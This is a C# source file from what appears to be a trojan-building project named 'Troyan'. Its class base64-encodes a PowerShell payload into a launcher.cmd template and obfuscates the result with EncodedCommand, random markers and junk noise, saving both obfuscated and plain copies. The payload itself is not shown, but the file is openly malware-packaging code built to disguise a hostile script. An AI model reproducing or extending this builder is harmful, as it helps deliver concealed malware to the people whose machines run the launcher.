using Commons;

namespace Troyan.Core;

/// <summary>Writes <c>troyan.cmd</c> with standard base64 of plain <c>body.debug.ps1</c>, then light-obfuscates (EncodedCommand, random markers, junk noise). Saves the pre-obfuscation text as <c>troyan.cmd.nonobfuscated</c>.</summary>
public sealed class TroyanPlainCmdEmitter : ITroyanPlainCmdEmitter
{
    private readonly ITroyanCmdObfuscator _obfuscator;

    public TroyanPlainCmdEmitter(ITroyanCmdObfuscator obfuscator) => _obfuscator = obfuscator;

    public void Write(ServerLayoutPaths layout)
    {
        var templatePath = Path.Combine(layout.TroyanVbsDir, "launcher.cmd");
        if (!File.Exists(templatePath))
            throw new FileNotFoundException("launcher.cmd not found for plain CMD.", templatePath);

        var bodyPs1 = layout.BodyPs1Debug;
        if (!File.Exists(bodyPs1))
            throw new FileNotFoundException("body.debug.ps1 must be built before plain CMD.", bodyPs1);

        var b64 = Convert.ToBase64String(File.ReadAllBytes(bodyPs1));
        var template = File.ReadAllText(templatePath);
        const string placeholder = "0102";
        if (!template.Contains(placeholder, StringComparison.Ordinal))
            throw new InvalidOperationException("launcher.cmd must contain the 0102 placeholder.");

        var plain = template.Replace(placeholder, b64, StringComparison.Ordinal);
        var obfuscated = _obfuscator.Obfuscate(plain);

        var dir = Path.GetDirectoryName(layout.TroyanOutputCmd);
        if (!string.IsNullOrEmpty(dir))
            Directory.CreateDirectory(dir);

        File.WriteAllText(layout.TroyanOutputCmdNonObfuscated, plain);
        File.WriteAllText(layout.TroyanOutputCmd, obfuscated);
    }
}
